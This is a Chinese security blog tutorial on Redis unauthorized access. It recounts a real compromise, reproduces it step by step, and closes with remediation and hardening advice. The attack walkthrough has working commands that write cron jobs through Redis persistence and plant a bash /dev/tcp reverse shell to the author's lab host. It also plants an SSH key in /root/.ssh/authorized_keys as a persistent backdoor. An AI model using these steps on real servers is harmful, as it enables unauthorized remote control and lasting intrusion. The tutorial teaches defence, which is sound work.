<template><div><blockquote>
<p>⚠️ 声明： 本文仅供学习交流使用，切勿用于非法用途 ⚠️</p>
</blockquote>
<h2 id="原理介绍" tabindex="-1"><a class="header-anchor" href="#原理介绍" aria-hidden="true">#</a> 🔨 原理介绍</h2>
<blockquote>
<p><strong>Redis 未授权访问</strong> 准确的来说，其实并不是一个漏洞。而是由于开发人员配置不当，而产生的预料之外的危害。
<br>
具体原理：</p>
<ol>
<li>可能由于部分业务要求，或者开发人员的配置不当，将 <code v-pre>redis</code> 服务器的 <code v-pre>ip</code> 和 <code v-pre>port</code> 暴露在公网上；</li>
<li>开发人员未配置 <code v-pre>redis</code> 的访问口令（<code v-pre>redis</code> 默认是不需要口令的），或者配置了弱口令；</li>
<li>攻击者通过爆破等方式，连接到 <code v-pre>redis</code> 终端，获取或者写入 <code v-pre>redis</code> 键值对。（<em>有部分开发人员会觉得自己项目 <code v-pre>redis</code> 中缓存了一部分不是很重要的公开数据，便没有重视 <code v-pre>redis</code> 的配置，也是 <code v-pre>redis</code> 未授权访问产生的重要原因之一</em>）；</li>
<li>攻击者利用缓存持久化、反弹 shell、权限维持等技术，直接远控主机进行<strong>任意操作</strong>（<em>这便是上面提到的预料意外的危害，可能部分开发会觉得仅仅是泄露一些无关紧要的数据而已，而实际上，远不止于此，远控主机之后，一旦进入内网，便可以肆虐整个公司网络环境</em>）。</li>
</ol>
</blockquote>
<h2 id="产生前提" tabindex="-1"><a class="header-anchor" href="#产生前提" aria-hidden="true">#</a> 🔨 产生前提</h2>
<ol>
<li>业务要求或开发人员配置不当，将 <code v-pre>redis</code> 服务器的 <code v-pre>ip</code> 和 <code v-pre>port</code> 暴露在公网上；
<ul>
<li><code v-pre>redis</code> 配置文件中注释了这一行代码（<em>本意为仅本地回环地址可访问，注释掉后意为不限制访问来源</em>）
<ul>
<li><code v-pre># bind 127.0.0.1</code></li>
</ul>
</li>
<li><code v-pre>redis</code> 配置文件中关闭了保护模式（<em>默认是打开的，打开情况下只有本地回环地址可以访问，与 bind 配合使用</em>）；
<ul>
<li><code v-pre>protected-mode : no</code></li>
</ul>
</li>
<li>防火墙或安全组规则开放端口（入方向）开放 <code v-pre>redis</code> 端口，默认：6379</li>
</ul>
</li>
<li>开发人员未配置 <code v-pre>redis</code> 的访问口令（<em>默认是不配置的</em>）。
<ul>
<li><code v-pre># requirepass</code></li>
</ul>
</li>
</ol>
<h2 id="场景还原-溯源" tabindex="-1"><a class="header-anchor" href="#场景还原-溯源" aria-hidden="true">#</a> 🔨 场景还原（溯源）</h2>
<p>接下来，我按照这个 <strong>攻击产生前提</strong> 对 aliyun 上的一台服务器进行配置。（下载 <code v-pre>redis</code> 的步骤就省略了）</p>
<ol>
<li>
<p>修改 <code v-pre>redis</code> 配置文件，关闭保护模式，关闭 ip 绑定；</p>
<figure><img src="https://img-blog.csdnimg.cn/ef9534e3c0734576ab444bcf8f011943.png" alt="请添加图片描述" tabindex="0" loading="lazy"><figcaption>请添加图片描述</figcaption></figure>
</li>
<li>
<p>配置 aliyun 入口规则，开放 <code v-pre>redis</code> 默认端口 <code v-pre>6379</code> 的访问；</p>
<figure><img src="https://img-blog.csdnimg.cn/5eeb594d4cca4f81b3caec42782a30ce.png" alt="请添加图片描述" tabindex="0" loading="lazy"><figcaption>请添加图片描述</figcaption></figure>
</li>
<li>
<p>等待一段时间（或许几十分钟，或许几个小时，或许一天，但一般不会超过 48 小时）</p>
<figure><img src="https://img-blog.csdnimg.cn/0a42af41e2234486b7fe6a89513f5335.gif" alt="请添加图片描述" tabindex="0" loading="lazy"><figcaption>请添加图片描述</figcaption></figure>
</li>
<li>
<p>收到了来自 aliyun 官方的安全告警</p>
<figure><img src="https://img-blog.csdnimg.cn/3c0188c8af5c47f0a33a9f2b48be0836.png" alt="请添加图片描述" tabindex="0" loading="lazy"><figcaption>请添加图片描述</figcaption></figure>
</li>
<li>
<p>连接 <code v-pre>redis</code> 终端，检查一下有什么变化？ 发现，在 <code v-pre>redis</code> 并未使用的情况下，多出了 4 个 名为 <code v-pre>backup</code> 的 <code v-pre>key</code>，查看 <code v-pre>backup1</code> 的 <code v-pre>value</code> 发现疑似一个 <code v-pre>cron</code> 定时任务指向一个 url 地址，地址中包含的是一个 <code v-pre>sh</code> 的脚本。</p>
<figure><img src="https://img-blog.csdnimg.cn/03de27bea7bd4dd9a66b5ce2dba748c5.png" alt="请添加图片描述" tabindex="0" loading="lazy"><figcaption>请添加图片描述</figcaption></figure>
</li>
<li>
<p>访问这个 <code v-pre>url</code> 地址获取 <code v-pre>sh</code> 脚本，进一步分析（⚠️⚠️⚠️ <font color=red><b>危险：建议在虚拟机或者测试机器访问，不要在本地计算机访问</b></font> ⚠️⚠️⚠️），我这里直接选择在 aliyun 服务器上访问，因为我这台服务器演示完这个场景后是准备重置的。</p>
<figure><img src="https://img-blog.csdnimg.cn/b948a847fc22496ab82379f8cdb8e109.png" alt="请添加图片描述" tabindex="0" loading="lazy"><figcaption>请添加图片描述</figcaption></figure>
</li>
<li>
<p>查看其它 3 个 <code v-pre>backup</code> 键的值，可以看到指向的是同一个恶意脚本，只是访问的方式和参数的区别</p>
<figure><img src="https://img-blog.csdnimg.cn/2fee3af1298b40258ae60071fd7c846f.png" alt="请添加图片描述" tabindex="0" loading="lazy"><figcaption>请添加图片描述</figcaption></figure>
</li>
<li>
<p>分析恶意脚本源码（由于脚本的性质，这里不做上传，需要的可以直接访问上面公网地址获取，切记不要在物理机访问），大致有三部分内容</p>
<ul>
<li>目录提权，命令伪造</li>
<li>杀死防御进程，杀死竞争进程，下载指定脚本并执行（这里才是真正执行恶意代码逻辑的脚本）</li>
<li>清理日志文件</li>
</ul>
</li>
</ol>
<h2 id="攻击原理分析" tabindex="-1"><a class="header-anchor" href="#攻击原理分析" aria-hidden="true">#</a> 🔨 攻击原理分析</h2>
<blockquote>
<p>看了上面的溯源过程，可能会有一个疑问。
<br>
<code v-pre>redis</code> 被写入了四个 <code v-pre>key</code> 为 <code v-pre>backup</code>，值为疑似计划任务命令的键值对，这个很容易理解，因为 <code v-pre>redis</code> 暴露在公网且没有口令验证，被写入值很正常<br>
但是，这条计划任务是如何运行的？恶意脚本又是如何被下载的？</p>
</blockquote>
<p>实际上，这里利用的是 <code v-pre>redis</code> 数据库中的数据持久化操作，使用动态命令将键值对信息持久化存储到磁盘的指定目录下，进而自动运行。具体如下：</p>
<ol>
<li>远程访问 <code v-pre>redis</code> ，写入 <code v-pre>key</code>、<code v-pre>value</code> 键值对。<code v-pre>key</code> 随意命名，<code v-pre>value</code> 为要执行的计划任务
<ul>
<li>如： <code v-pre>* * * * * echo $(date) &gt;&gt; /root/data.txt</code></li>
<li>意为： 每分钟向 <code v-pre>/root/data.txt</code> 文件中追加一次时间</li>
<li>在 <code v-pre>linux</code> 中，<code v-pre>cron</code> 只有 <strong>分、时、日、月、周</strong> 六位，没有秒级，如果需要以秒为单位，可以使用脚本或者 <code v-pre>sleep</code> 方法来配合实现</li>
</ul>
</li>
<li>动态配置 <code v-pre>redis</code> 文件持久化路径，并执行持久化命令
<ul>
<li><code v-pre>config set dir /var/spool/cron/</code>
<ul>
<li><code v-pre>/var/spool/cron</code> 这个目录是 <code v-pre>linux</code> 定时任务目录之一</li>
</ul>
</li>
<li><code v-pre>config set dbfilename root</code>
<ul>
<li><code v-pre>root</code> root 对应的是 <code v-pre>/var/spool/cron</code> 定时任务目录下的子目录，该目录下的定时任务是以用户为纬度存储的，所以这里保存的目录名称应该是当前登录的用户名 root</li>
</ul>
</li>
<li><code v-pre>save</code>
<ul>
<li>手动触发 <code v-pre>redis</code> 文件持久化</li>
</ul>
</li>
</ul>
</li>
<li>等待计划任务自动触发</li>
</ol>
<h2 id="攻击流程复现" tabindex="-1"><a class="header-anchor" href="#攻击流程复现" aria-hidden="true">#</a> 🔨 攻击流程复现</h2>
<blockquote>
<p>这里的复现流程有一个前提：被攻击机的 <code v-pre>redis</code> 是使用 <code v-pre>root</code> 账户启动的。 如果不是 <code v-pre>root</code> 账户启动，可能后面的复现写入数据时会遇到各种各样的权限不足的问题。</p>
</blockquote>
<h3 id="_1-远程连接-redis-服务-写入定时任务" tabindex="-1"><a class="header-anchor" href="#_1-远程连接-redis-服务-写入定时任务" aria-hidden="true">#</a> 1. 远程连接 <code v-pre>redis</code> 服务，写入定时任务</h3>
<ul>
<li><code v-pre>set backup &quot;\n* * * * * echo $(date) &gt;&gt; /root/data.txt\n&quot;</code>
<ul>
<li>如果遇到 <code v-pre>MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error</code> 报错，在终端执行 <code v-pre>config set stop-writes-on-bgsave-error no</code> 即可（或者直接在 <code v-pre>redis.conf</code> 配置文件中改为 <code v-pre>stop-writes-on-bgsave-error no</code> 后重启 <code v-pre>redis</code> 服务也可以）</li>
</ul>
</li>
</ul>
<h3 id="_2-动态配置-redis-的持久化路径和文件名-手动持久化-触发定时任务的保存" tabindex="-1"><a class="header-anchor" href="#_2-动态配置-redis-的持久化路径和文件名-手动持久化-触发定时任务的保存" aria-hidden="true">#</a> 2. 动态配置 <code v-pre>redis</code> 的持久化路径和文件名，手动持久化，触发定时任务的保存</h3>
<ul>
<li>
<p><code v-pre>config set dir /var/spool/cron/</code></p>
<ul>
<li>配置 <code v-pre>redis</code> 持久化文件存储路径为 <code v-pre>/var/spool/cron</code>。该目录是 <code v-pre>linux</code> 系统定时任务存储的目录之一</li>
</ul>
</li>
<li>
<p><code v-pre>config set dbfilename root</code></p>
<ul>
<li>配置 <code v-pre>redis</code> 持久化文件存储名称为 <code v-pre>root</code>。 该文件是 <code v-pre>root</code> 用户创建的定时任务存储的文件之一</li>
</ul>
</li>
<li>
<p><code v-pre>save</code></p>
<ul>
<li>手动触发 <code v-pre>redis</code> 持久化</li>
</ul>
</li>
<li>
<p>过程如图</p>
<figure><img src="https://img-blog.csdnimg.cn/1e140e14b48e46c1bfa6a8ad76ab01ca.png" alt="在这里插入图片描述" tabindex="0" loading="lazy"><figcaption>在这里插入图片描述</figcaption></figure>
</li>
</ul>
<h3 id="_3-等待几分钟之后-进入虚拟机-被攻击机-查看效果" tabindex="-1"><a class="header-anchor" href="#_3-等待几分钟之后-进入虚拟机-被攻击机-查看效果" aria-hidden="true">#</a> 3. 等待几分钟之后，进入虚拟机（被攻击机）查看效果</h3>
<ul>
<li>
<p><code v-pre>crontab -u root -l</code> 查看已有的计划任务</p>
<ul>
<li>其他 <code v-pre>crontab</code> 命令
- <code v-pre>crontab -u root -r</code>：删除某个用户的定时任务
- <code v-pre>crontab -u root -time.cron</code>：把文件添加到某个用户的定时任务（time.cron 是一个文本文件名，文本的内容是一个或者多个 cron 表达式）
- <code v-pre>crontab -u root -l</code>：列举某个用户的定时任务
- <code v-pre>crontab -u root -e</code>：编辑某个用户的定时任务</li>
</ul>
</li>
<li>
<p><code v-pre>tail -f /root/data.txt</code> 实时查看 <code v-pre>/root/data.txt</code> 文件内容（<em>这个文件就是上面计划任务中 echo 命令指向的文件，如果有每分钟输出一次时间，就说明计划任务创建成功了</em>）</p>
</li>
<li>
<p>过程如图（可以看到，成功了✌️）：</p>
</li>
</ul>
<figure><img src="https://img-blog.csdnimg.cn/7b30070d6c9d4b569bbf86418cd8c390.png" alt="在这里插入图片描述" tabindex="0" loading="lazy"><figcaption>在这里插入图片描述</figcaption></figure>
<h3 id="_4-进阶-定时任务反弹-shell-获取权限" tabindex="-1"><a class="header-anchor" href="#_4-进阶-定时任务反弹-shell-获取权限" aria-hidden="true">#</a> 4. （进阶）定时任务反弹 shell 获取权限</h3>
<blockquote>
<p>以上，其实 Redis 未授权访问产生的原理与造成的危害已经显而易见了。但是，上面最终仅仅是实现了在目标机器中创建一个文件并写入了一些内容，而可造成的危害远不仅于此... 🙈</p>
</blockquote>
<blockquote>
<p>既然可以创建文件，并写入文本，那说明，其实已经可以让目标机器执行一些自定义指令了，可以尝试实现远控。</p>
</blockquote>
<ol>
<li>
<p>在本机开启一个监听端口 <code v-pre>8888</code> （这个端口随便定义，只要不冲突就行）</p>
<ul>
<li><code v-pre>nc -lvp 8888</code> 开始监听 <code v-pre>8888</code> 端口
<ul>
<li><code v-pre>nc</code> 是 <code v-pre>netcat</code>工具的命令，大多数 <code v-pre>linux</code> 系统自带 <code v-pre>netcat</code>， windows 机器可以在官网（ <code v-pre>https://eternallybored.org/misc/netcat/</code> ）下载，记得关闭杀软或者加入白名单。</li>
</ul>
</li>
<li>如图
<img src="https://img-blog.csdnimg.cn/a38f7afb966942028692ff5e3f559b3a.png" alt="在这里插入图片描述" loading="lazy"></li>
</ul>
</li>
<li>
<p>重新打开一个命令行窗口（监听窗口不要关），按照上面攻击复现的步骤 1 ~ 3，在目标机器的定时任务中写入反弹<code v-pre>shell</code>脚本，并等待其执行（执行成功后，监听窗口会有变化）。</p>
<ul>
<li>连接 <code v-pre>redis</code>。（<code v-pre>133</code> 是我的 redis 服务器）
<ul>
<li><code v-pre>redis-cli.exe -h 192.168.136.133</code></li>
</ul>
</li>
<li>写入键值对，值为定时任务，1 分钟后执行反弹 <code v-pre>shell</code> 命令
<ul>
<li><code v-pre>set x &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.136.1/8888 0&gt;&amp;1\n\n&quot;</code></li>
<li><code v-pre>\n</code> 是换行符，目的是为了与之前已经存在的定时任务分行</li>
<li><code v-pre>bash -i &gt;&amp; /dev/tcp/192.168.136.1/8888 0&gt;&amp;1</code> 是最基本的 <code v-pre>bash</code> 反弹连接命令，<code v-pre>136.1</code> 是我本机的 ip 地址，<code v-pre>8888</code> 是上一步中设置的监听端口。</li>
</ul>
</li>
<li>修改 <code v-pre>redis</code> 持久化存储目录和文件名，触发持久化（<code v-pre>config set</code> 是动态持久化，仅在当前窗口生效，窗口关闭后需要重新设置）
<ul>
<li><code v-pre>config set dir /var/spool/cron/</code></li>
<li><code v-pre>config set dbfilename root</code></li>
<li><code v-pre>save</code></li>
</ul>
</li>
<li>过程如图
<img src="https://img-blog.csdnimg.cn/e606eecae5d54711a7dacbecb051abe1.png" alt="在这里插入图片描述" loading="lazy"></li>
</ul>
</li>
<li>
<p>打开第一步中的监听窗口，等待一小会儿 🕔（一分钟之内）</p>
<ul>
<li>
<p><code v-pre>shell</code> 反弹成功，本机已经成功远程连接目标机器</p>
<figure><img src="https://img-blog.csdnimg.cn/e0a87904c25446ce8fff4147fbbbbec0.png" alt="在这里插入图片描述" tabindex="0" loading="lazy"><figcaption>在这里插入图片描述</figcaption></figure>
</li>
<li>
<p>执行两个命令证实一下，可以看到，此时的监听窗口已经连接上了远程机器的终端，并且可以返回了系统版本与当前用户名。</p>
<figure><img src="https://img-blog.csdnimg.cn/c5cb436dcc5542998a6b03415d0ff501.png" alt="在这里插入图片描述" tabindex="0" loading="lazy"><figcaption>在这里插入图片描述</figcaption></figure>
</li>
</ul>
</li>
</ol>
<h3 id="_5-进阶-ssh-key-免密登录-权限维持" tabindex="-1"><a class="header-anchor" href="#_5-进阶-ssh-key-免密登录-权限维持" aria-hidden="true">#</a> 5. （进阶）SSH key 免密登录，权限维持</h3>
<blockquote>
<p>在第 4 步中，已经成功的进入了目标主机，但是我们是借用 <code v-pre>redis</code> 未授权访问的漏洞才成功的，如果定时任务被维护人员发现并删除了呢？如果 <code v-pre>redis</code> 的配置被修复了，无法通过远程访问 <code v-pre>redis</code> 了呢？</p>
</blockquote>
<blockquote>
<p>思来想去，决定留一个后门，方便后期随时进入目标主机。</p>
</blockquote>
<ol>
<li>
<p>本机生成 <code v-pre>ssh key</code> 公私钥对。</p>
<ul>
<li><code v-pre>ssh-keygen</code> 命令是用来生成 <code v-pre>ssh key</code> 公私钥对的。
<ul>
<li>这个命令需要安装 <code v-pre>ssh</code> 才可以使用，<code v-pre>git</code> 中也集成了 <code v-pre>ssh</code>，如果电脑中装过 git 的也可以直接使用。</li>
<li>公私钥对是最常见的一种免密登录验证方式，大名鼎鼎的 <code v-pre>github</code> 的免密登录使用的就是这种。</li>
<li>基本原理也比较简单，就是通过加密算法，生成两个文件，一个公钥，一个私钥，两个是配套的，然后将公钥发送给目标主机存储起来，后续如果客户机想访问目标机器时，直接带着私钥去访问目标主机，目标主机经过核对，公私钥配套成功，就可以直接可以访问而不需要在输密码了。<img src="https://img-blog.csdnimg.cn/9a458ced1bd1490c80895f5d059c695c.png" alt="在这里插入图片描述" loading="lazy"></li>
</ul>
</li>
</ul>
</li>
<li>
<p>在存储路径下，找到公钥，用记事本打开，复制文本内容</p>
<figure><img src="https://img-blog.csdnimg.cn/4db3931782fe42279946263d3d7963ae.png" alt="在这里插入图片描述" tabindex="0" loading="lazy"><figcaption>在这里插入图片描述</figcaption></figure>
</li>
<li>
<p>打开第 4 步中反弹连接的窗口（在第 4 步中，已经成功连接到目标主机），在目标主机上创建 <code v-pre>ssh</code> 文件并写入公钥</p>
<ul>
<li>
<p>进入远程主机的 <code v-pre>ssh key</code> 存储路径（<code v-pre>/root/.ssh</code>）如果没有 <code v-pre>.ssh</code> 文件，就创建一个</p>
<ul>
<li><code v-pre>cd /root</code></li>
<li><code v-pre>mkdir .ssh</code></li>
<li><code v-pre>ls -a</code>  因为 <code v-pre>.ssh</code> 是隐藏文件，所以使用 <code v-pre>-a</code> 参数</li>
<li><code v-pre>cd .ssh</code></li>
<li><code v-pre>echo &quot;ssh-rsa AAAAABBBBCCCCXXXXX &quot; &gt;&gt; authorized_keys</code>
<ul>
<li>引号中的是生成的公钥信息，更换成自己的</li>
<li><code v-pre>authorized_keys</code> 是 <code v-pre>linux</code> 中用来存储授权信息的文件</li>
</ul>
</li>
</ul>
</li>
<li>
<p>如图</p>
<figure><img src="https://img-blog.csdnimg.cn/6943e044623449f4b1bcc0818b392311.png" alt="在这里插入图片描述" tabindex="0" loading="lazy"><figcaption>在这里插入图片描述</figcaption></figure>
</li>
</ul>
</li>
<li>
<p>关闭监听窗口，新开一个窗口，免密登录远程机器</p>
<ul>
<li>ssh 携私钥免密登录远程机器
<ul>
<li><code v-pre>ssh -i ./id_rsa root@192.168.136.133</code>
<ul>
<li>这里 <code v-pre>./id_rsa</code> 是私钥的位置，因为我是进入到 <code v-pre>.ssh</code> 目录中执行 <code v-pre>ssh</code> 命令的，<code v-pre>./</code> 代表当前目录</li>
</ul>
</li>
</ul>
</li>
<li>可以看到直接登录成功（如果出现警告，直接输入 <code v-pre>yes</code> 回车即可）</li>
<li>尝试执行几条命令验证结果，可以看到，机器 <code v-pre>ip</code> 是 <code v-pre>133</code> 远程主机，用户是 <code v-pre>root</code></li>
<li>这样，即使 <code v-pre>redis</code> 更新了配置文件，我们也可以通过 <code v-pre>ssh</code> 免密登录对主机进行远控。</li>
<li>如图
<img src="https://img-blog.csdnimg.cn/9ccf281fb3a44e72957f54ac37162503.png" alt="在这里插入图片描述" loading="lazy"></li>
</ul>
</li>
</ol>
<h2 id="修复与加固方案" tabindex="-1"><a class="header-anchor" href="#修复与加固方案" aria-hidden="true">#</a> 🔨 修复与加固方案</h2>
<h3 id="问题修复-只针对上述案例-真实场景中更复杂" tabindex="-1"><a class="header-anchor" href="#问题修复-只针对上述案例-真实场景中更复杂" aria-hidden="true">#</a> 问题修复（只针对上述案例，真实场景中更复杂）</h3>
<ol>
<li>
<p>端口排查，先检查是否有可疑端口在与主机建立连接，如有，将其 <code v-pre>kill</code>（案例中是使用 <code v-pre>bash</code> 连接的）
<img src="https://img-blog.csdnimg.cn/1b822e343d1f4312a46fc4b8708a798b.png" alt="在这里插入图片描述" loading="lazy"></p>
</li>
<li>
<p>检查定时任务、服务、自启程序等，可以配合日志一起检查，如果发现可疑的任务，将其终止
<img src="https://img-blog.csdnimg.cn/53322d286dbf422aaa7f63ce31145e46.png" alt="在这里插入图片描述" loading="lazy"></p>
</li>
<li>
<p>检查 <code v-pre>.ssh</code> 文件，是否有可疑的认证凭据，如有，将其删除</p>
<figure><img src="https://img-blog.csdnimg.cn/51948fdf31db48fdaa5f22656a7c5c95.png" alt="在这里插入图片描述" tabindex="0" loading="lazy"><figcaption>在这里插入图片描述</figcaption></figure>
</li>
<li>
<p>对 <code v-pre>redis</code> 进行加固（访问限制、密码配置等）</p>
</li>
<li>
<p>复查定时任务、服务、自启程序、日志、端口（一定要复查，防止在删除凭证，对 redis 加固期间，恶意程序进行转移和复活）</p>
</li>
</ol>
<h3 id="redis-加固" tabindex="-1"><a class="header-anchor" href="#redis-加固" aria-hidden="true">#</a> Redis 加固</h3>
<blockquote>
<p>就本案例而言，归根结底，后面一系列危害的根本原因还是 <code v-pre>redis</code> 配置不当，暴露于外网并且无口令验证。</p>
</blockquote>
<ol>
<li>
<p>限制 <code v-pre>redis</code> 访问 <code v-pre>ip</code>。（通常 <code v-pre>redis</code> 都是在内网环境，很少暴露在外网，如果业务需求一定要外网访问，可以配置白名单管控），这是摘自 <code v-pre>redis</code> 官网【安全配置】中的一段话。</p>
<blockquote>
<p>Security model
Redis is designed to be accessed by trusted clients inside trusted environments. This means that usually it is not a good idea to expose the Redis instance directly to the internet or, in general, to an environment where untrusted clients can directly access the Redis TCP port or UNIX socket.</p>
</blockquote>
</li>
<li>
<p>修改默认端口。将 <code v-pre>redis</code> 的默认端口 <code v-pre>6379</code> 修改为其他端口，从一定程度上也可以降低一定的风险，但并不能完全避免。</p>
</li>
<li>
<p>配置访问口令。<code v-pre>redis</code> 默认是不需要口令的，但是为了安全起见，还是建议配置口令，并且要避免弱口令。</p>
</li>
<li>
<p>配置专用用户。满足权限最小化原则，专项业务专人管理，配置单独的管理账号（尤其不要使用 <code v-pre>root</code> 账户运行）</p>
</li>
</ol>
</div></template>


